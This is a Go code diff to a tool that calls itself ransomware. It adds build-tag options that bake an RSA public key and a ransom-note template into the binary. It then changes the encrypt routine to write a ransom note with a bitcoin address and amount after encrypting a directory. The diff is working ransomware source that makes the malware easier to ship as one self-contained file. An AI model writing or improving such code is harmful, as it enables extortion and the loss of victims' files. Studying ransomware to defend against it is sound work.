@@ -15,6 +15,7 @@ import (
 
 	"github.com/marmos91/ransomware/crypto"
 	"github.com/marmos91/ransomware/fs"
+	"github.com/marmos91/ransomware/ransom"
 	urfavecli "github.com/urfave/cli/v2"
 )
 
@@ -56,6 +57,46 @@ func loadPublicKey(path string) (*rsa.PublicKey, error) {
 		return nil, err
 	}
 	return crypto.ParseRsaPublicKeyFromPemStr(pem)
+}
+
+// HasEmbeddedPublicKey reports whether a public key was baked into the binary
+// at build time (-tags embedpubkey).
+func HasEmbeddedPublicKey() bool {
+	return strings.TrimSpace(EmbeddedPublicKeyPEM) != ""
+}
+
+// resolvePublicKey loads the RSA public key from path when provided; otherwise
+// it uses the key embedded in the binary (if any).
+func resolvePublicKey(path string) (*rsa.PublicKey, error) {
+	if path != "" {
+		return loadPublicKey(path)
+	}
+	if !HasEmbeddedPublicKey() {
+		return nil, errors.New("--publicKey is required when no public key is embedded in the binary (build with -tags embedpubkey and cli/pub.pem)")
+	}
+	return crypto.ParseRsaPublicKeyFromPemStr(EmbeddedPublicKeyPEM)
+}
+
+// HasEmbeddedRansomTemplate reports whether a ransom note template was baked
+// into the binary at build time (-tags embedransom).
+func HasEmbeddedRansomTemplate() bool {
+	return strings.TrimSpace(ransom.EmbeddedTemplate) != ""
+}
+
+// resolveRansomTemplate loads a Go text/template from path when provided;
+// otherwise it uses the template embedded in the binary (if any).
+func resolveRansomTemplate(path string) (*template.Template, error) {
+	if path != "" {
+		templateAbsPath, err := filepath.Abs(path)
+		if err != nil {
+			return nil, err
+		}
+		return template.ParseFiles(templateAbsPath)
+	}
+	if !HasEmbeddedRansomTemplate() {
+		return nil, errors.New("--ransomTemplatePath is required when addRansom is enabled and no template is embedded in the binary (build with -tags embedransom)")
+	}
+	return template.New("ransom").Parse(ransom.EmbeddedTemplate)
 }
 
 func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
@@ -149,8 +190,8 @@ func Encrypt(ctx *urfavecli.Context) error {
 		return errors.New("--partial must be a non-negative number of bytes")
 	}
 
-	if addRansom && ransomTemplatePath == "" {
-		return errors.New("ransomTemplatePath is required when addRansom is enabled")
+	if addRansom && ransomTemplatePath == "" && !HasEmbeddedRansomTemplate() {
+		return errors.New("--ransomTemplatePath is required when addRansom is enabled and no template is embedded in the binary (build with -tags embedransom)")
 	}
 
 	absolutePath, err := filepath.Abs(path)
@@ -158,7 +199,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 		return err
 	}
 
-	publicKey, err := loadPublicKey(publicKeyPath)
+	publicKey, err := resolvePublicKey(publicKeyPath)
 	if err != nil {
 		return err
 	}
@@ -166,7 +207,24 @@ func Encrypt(ctx *urfavecli.Context) error {
 	if !validKeySizes[int(keySizeBits)] {
 		return fmt.Errorf("unsupported RSA key size: %d bits (supported: 2048, 3072, 4096)", keySizeBits)
 	}
-	slog.Info("RSA public key loaded", "keySize", keySizeBits)
+	if publicKeyPath != "" {
+		slog.Info("RSA public key loaded", "keySize", keySizeBits, "source", "file")
+	} else {
+		slog.Info("RSA public key loaded", "keySize", keySizeBits, "source", "embedded")
+	}
+
+	var ransomTmpl *template.Template
+	if addRansom {
+		ransomTmpl, err = resolveRansomTemplate(ransomTemplatePath)
+		if err != nil {
+			return err
+		}
+		if ransomTemplatePath != "" {
+			slog.Info("Ransom template loaded", "source", "file", "path", ransomTemplatePath)
+		} else {
+			slog.Info("Ransom template loaded", "source", "embedded")
+		}
+	}
 
 	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)
 	if err != nil {
@@ -212,7 +270,7 @@ func Encrypt(ctx *urfavecli.Context) error {
 	}
 
 	if addRansom {
-		return writeRansomNote(absolutePath, ransomFileName, ransomTemplatePath, publicKey, bitcoinAddress, bitcoinCount)
+		return writeRansomNote(absolutePath, ransomFileName, ransomTmpl, publicKey, bitcoinAddress, bitcoinCount)
 	}
 
 	return nil
@@ -276,19 +334,9 @@ func Decrypt(ctx *urfavecli.Context) error {
 	return nil
 }
 
-func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) (retErr error) {
+func writeRansomNote(dir, fileName string, tmpl *template.Template, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) (retErr error) {
 	ransomPath := filepath.Join(dir, fileName)
 	slog.Info("Adding ransom file", "path", ransomPath)
-
-	templateAbsPath, err := filepath.Abs(templatePath)
-	if err != nil {
-		return err
-	}
-
-	tmpl, err := template.ParseFiles(templateAbsPath)
-	if err != nil {
-		return err
-	}
 
 	textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)
 	if err != nil {
